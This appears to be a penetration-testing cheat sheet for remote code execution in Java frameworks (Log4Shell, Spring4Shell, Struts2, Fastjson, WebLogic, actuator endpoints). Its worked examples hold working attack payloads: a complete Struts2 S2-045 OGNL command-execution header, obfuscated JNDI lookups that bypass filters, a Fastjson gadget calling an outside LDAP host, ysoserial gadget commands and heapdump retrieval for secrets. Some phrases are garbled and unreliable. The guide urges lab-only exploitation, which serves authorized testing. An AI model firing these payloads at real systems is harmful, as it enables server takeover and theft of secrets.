# HOW TO TEST FRAMEWORK RCE ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN
App-server & framework CVE classes: Log4Shell, Spring4Shell, Struts2, WebLogic, Fastjson, Jackson, Snapshot.

## The N ways to test (framework RCE is a k-armed manifold)
1. Version fingerprinting: banners, error pages (JBoss, Tomcat, Spring actuator, Beaver logs).
2. Known CVE probes (check list below) - each with 1-request denial-free payload.
3. Deserialization gadgets: ysoserial/rmiscout demo mode on YOUR endpoint; if java app -> check
   serialized data handling via cookies / POST binary / toString operators.
4. Log-events with user input reaching a logger (Log4j pattern) = L4S breadcrumbs.
5. Classic app-args: expression language (EL) via params (Struts2 OGNL, Spring SpEL, Pпреров Jackson).
6. OGNL/EL payloads in any form value make a direct exec attempt.
7. Fastjson autoType (JSON field "@type":...), Jackson polymorphic.
8. Snapshot/ /actuator/env, /console, h2-console, /_debug, jolokia exposes servers with command.

## Step-by-step on target (methodical)
1. Fingerprint: /, /error, /favicon.ico (MD5 hash match), headers, JS bundle versions.
2. For each candidate framework pull the update-relevant CVE:
   - Log4Shell CVE-2021-44228: ${jndi:ldap://YOUR-COLLABORATOR/a} in User-Agent/name/payload.
   - Spring4Shell CVE-2022-22965: class.module.classLoader defaults - only with Tomcat packaging + WAR.
   - Struts2 S2-045/046/057 (content-type, filename, OGNL).
   - WebLogic CVE-2020-14882 + 14883 (browser exploit trusted by the server).
   - Fastjson <=1.2.80, Jackson gadget abuse on deserialization endpoints.
   - Apache Commons Text CVE-2022-42889 (${script:javascript:...}).
3. If you hit /actuator or JBoss-console -> you already have risk loud + clear.
4. Deploy the matching PoC ONLY on a box you own; for a real target do detection only + report.

## The million-dollar bit
- Finding ONE Java app with Log4j logging user input is a remote shell waiting. Check for calls to
  JNDI/logging (echo-backs), not just headers. Use Collaborator, tracks both LDAP and DNS.

## Bypass ladder
- Log4j logging-filters: ${env:} ${sys:} ${jndi:} case/space variants - many bypasses by
  pattern (nested lookups ${${lower:j}${upper:N}di:...}).
- Spring4Shell payloads need a matches-pattern bypass (class.module... obfuscation).

## False positives
- Error pages showing a framework = INFO, not a vuln by itself.
- ${jndi:..} reflected in response = REIMPLICATION check; real proof needs an OOB hit or command echo.
- If the app is behind proxy and logs nothing you'll only see Collaborator pings - that's real for DNS.

## Tools
- Burp, ysoserial, marshalsec, jshell/jndi-ExploitKit on your lab; JNDI-Exploit-Kit for join.

## WORKED EXAMPLES (concrete)
A. Log4Shell detection (1 request, OOB non-invasive):
```
curl -i -H "User-Agent: \${jndi:ldap://YOUR-COLLABORATOR.burpcollaborator.net/a}" \
     "https://target.com/login"
also test in: name, email, Referer name param, X-Forwarded-For. Watch Collaborator for LDAP/DNS.
Obfuscated (filter bypass):
${${lower:j}${upper:n}${env:ORACLE_HOME:}di:ldap://YOUR-COLLABORATOR/a}
B. Spring4Shell probe (detect-only form):
curl -i "https://target.com/?" + template  # actual exploit requires Tomcat+WAR+param binding:
name=class.module.classLoader.resources.context.parent.pipeline.first.pattern=...
For a real target: prove with error/status change only, run exploit on YOUR lab.
C. Struts2 S2-045 (Content-Type OGNL):
curl -i -X POST -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
     "https://target.com/upload.do"
D. Fastjson detection (raw autoType):
POST /api  {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-COLLABORATOR/a","autoCommit":true}}
E. Actuator/console reach:
curl -i "https://target.com/actuator/env"
curl -i "https://target.com/actuator/heapdump"        # dump secrets
curl -i "https://target.com/console"                  # JBoss/h2
curl -i "https://target.com/jolokia"                  # read MBeans/env
(JNDI/LDAP payload from YOUR lab - many targets block outbound: DOCUMENT the OOB side, don't force RCE)
F. Deserialization (java):
ysoserial <gadget> CommonsCollections1 'cmd' -o raw > payload.bin   (lab)
then send payload.bin as the request body / cookie  "user=payload.bin".
G. Framework flag: window:Tomcat 9 -> then only test Tomcat-adjacent paths (4shell, L4S).
```
